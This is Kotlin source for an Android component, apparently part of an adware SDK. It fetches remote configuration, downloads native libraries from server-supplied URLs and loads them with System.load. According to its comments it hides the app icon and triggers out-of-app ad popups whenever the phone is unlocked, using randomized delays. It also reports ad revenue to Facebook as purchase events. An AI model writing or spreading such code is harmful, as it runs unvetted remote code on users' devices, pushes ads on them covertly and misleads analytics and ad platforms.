package meg

import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import androidx.core.content.ContextCompat
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.simmer.grace.GraceHelper
import com.vivo.core.AppLifelListener
import com.vivo.core.Core
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import wall.A
import java.io.File
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false //是否显示广告

    @JvmStatic
    var lastSAdTime = 0L //上一次显示广告的时间

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限

    private var numHour = Core.getInt("show_hour_num")
    private var numDay = Core.getInt("show_day_num")
    private var isCurDay = Core.getStr("last_cur_day")
    private var numJumps = Core.getInt("num_jum_p")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var fileName = ""// 文件开关名
    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var maxShowTime = 10000L // 最大显示时间
    private var screenOpenCheck = 1400L // 屏幕监测、延迟显示
    private var soUrlH5 = ""

    private var soUrlW = ""

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("num_jum_p", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Core.pE("advertise_limit")
    }

    private fun sC() {
        Core.saveInt("show_hour_num", numHour)
        Core.saveInt("show_day_num", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("l_hour_t")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("l_hour_t", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("last_cur_day", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    private fun postFcm() {
        try {
            if (e.a.b == 10) {
                e.a.b = -1
                Core.pE("receiver_fcm")
            }
        } catch (e: Exception) {
        }
    }

    @JvmStatic
    fun a2() {
        postFcm()
        mContext.registerActivityLifecycleCallbacks(AppLifelListener())
        refreshAdmin()
        File("${mContext.dataDir}/$fileName").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString("guava_url")//So 解密的key
        val listStr = js.optString("guava_str").split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        fileName = listStr[3]

        AdCenter.setAdId(js.optString("guava_id_list"))// 广告id
        val lt = js.optString("guava_tim").split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        nHourShowMax = lt[2].toInt()
        nDayShowMax = lt[3].toInt()
        nTryMax = lt[4].toInt()
        timeDS = lt[5].toLong()
        timeDE = lt[6].toLong()
        maxShowTime = lt[7].toLong() * 1000
        screenOpenCheck = lt[8].toLong()
        val lSoU = js.optJSONArray("guav_url_s")
        if (isF()) {
            soUrlW = lSoU[0].toString()
            soUrlH5 = lSoU[2].toString()
        } else {
            soUrlW = lSoU[1].toString()
            soUrlH5 = lSoU[3].toString()
        }
    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = Core.getStr("summer_config")
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun dS(file: File) {
        mMainScope.launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loSo(file)
            }
            if (i.not()) {
                Core.pE("ss_l_f")
                return@launch
            }
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            A.a0(tagL)
            delay(1500)
            while (true) {
                postFcm()
                // 刷新配置
                refreshAdmin()
                checkAd()
                delay(cTime)
                if (numJumps > nTryMax) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }
    }

    private fun t() {
        val parentFile = File("${mContext.filesDir}")
        val save = File(parentFile, "fileMine")
        FileDownLoad("").fileD(soUrlW, success = {
            dS(save)
            mMainScope.launch(Dispatchers.IO) {
                delay(1000)
                val hFile = File(parentFile, "fileMineH")
                FileDownLoad("Hh").fileD(soUrlH5, success = {
                    loSo(hFile)
                    mMainScope.launch {
                        try {
                            A.b(mContext)
                            isLoadH = true
                        } catch (_: Throwable) {
                        }
                    }
                }, hFile)
            }
        }, save)
    }

    private fun loSo(assetsName: File): Boolean {
        try {
            assetsName.setReadOnly()
            System.load(assetsName.absolutePath)
            return true
        } catch (_: Exception) {
        }
        return false
    }


    private fun isF(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }

    @JvmStatic
    fun adLoadSuccess() {
        openJob()
    }

    @JvmStatic
    fun checkAdIsReadyAndGoNext() {
        if (AdCenter.isAdReady()) {
            jobTimer?.cancel()
            jobTimer = null
            openJob()
        }
    }

    private var jobTimer: Job? = null
    private var timJobStart = 0L

    @JvmStatic
    private fun openJob() {
        if (jobTimer != null && jobTimer?.isActive == true) return
        timJobStart = System.currentTimeMillis()
        Core.pE("advertise_done")
        jobTimer = mMainScope.launch {
            val del = tPer - (System.currentTimeMillis() - lastSAdTime)
            delay(del)
            Core.pE("advertise_times")
            val sDel = maxShowTime - (System.currentTimeMillis() - lastSAdTime)
            if (sDel > 0) {
                Core.pE("ad_showing")
                delay(sDel)
            }
            if (l().not()) {
                while (l().not()) {
                    delay(screenOpenCheck)
                }
            }
            Core.pE("ad_light")
            delay(finishAc())
            sNumJump(numJumps + 1)
            Core.pE("ad_start")
            A.a0(tagO)
            lastSAdTime = System.currentTimeMillis()
            delay(4000)
            checkAdIsReadyAndGoNext()
        }
    }

    // 新逻辑
    private fun checkAd() {
        if (isNetworkAvailable().not()) return
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        Core.pE("ad_pass", "null")
        AdCenter.loadAd()
        if (System.currentTimeMillis() - timJobStart > 90000) {
            checkAdIsReadyAndGoNext()
        }
    }


    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    @JvmStatic
    fun finishAc(): Long {
        if (l().not()) return 0
        if (e.a.b().isNotEmpty()) {
            ArrayList(e.a.b()).forEach {
                it.finishAndRemoveTask()
            }
            return 1200
        }
        return 0
    }

    private fun l(): Boolean {
        return (mContext.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (mContext.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent("ad_impression_wall", b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Core.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }


    @JvmStatic
    fun openService(context: Context) {

        val intent = Intent(context, GraceHelper::class.java)
        try {
            ContextCompat.startForegroundService(context, intent)
        } catch (t: Throwable) {
        }
    }
}